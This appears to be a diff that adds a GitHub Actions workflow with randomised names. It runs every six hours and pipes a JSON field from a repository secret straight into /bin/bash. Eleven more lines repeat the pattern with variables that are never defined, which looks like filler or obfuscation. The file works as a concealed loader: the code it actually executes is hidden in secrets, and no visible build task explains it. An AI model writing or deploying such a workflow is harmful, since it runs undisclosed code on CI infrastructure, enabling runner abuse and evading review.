@@ -1,0 +1,29 @@
+name: xiaohuanguan1289
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaohuanguan1289
+        env:
+          syoqo7664: ${{ secrets.syoqo7664 }}
+        run: |
+          echo $syoqo7664 | jq -r .eqs39559 | /bin/bash
+          echo $g50 | jq -r .onm75 | /bin/bash
+          echo $xwk85877 | jq -r .obnu83065 | /bin/bash
+          echo $vyht26 | jq -r .lw8 | /bin/bash
+          echo $i494 | jq -r .iqbt509 | /bin/bash
+          echo $j4 | jq -r .ng046 | /bin/bash
+          echo $vbopw84437 | jq -r .dzds9 | /bin/bash
+          echo $tplfa499 | jq -r .ot7144 | /bin/bash
+          echo $hva7955 | jq -r .gqw6248 | /bin/bash
+          echo $d527 | jq -r .fo123 | /bin/bash
+          echo $hm31290 | jq -r .gusej765 | /bin/bash
+          echo $ir060 | jq -r .djbl314 | /bin/bash
+
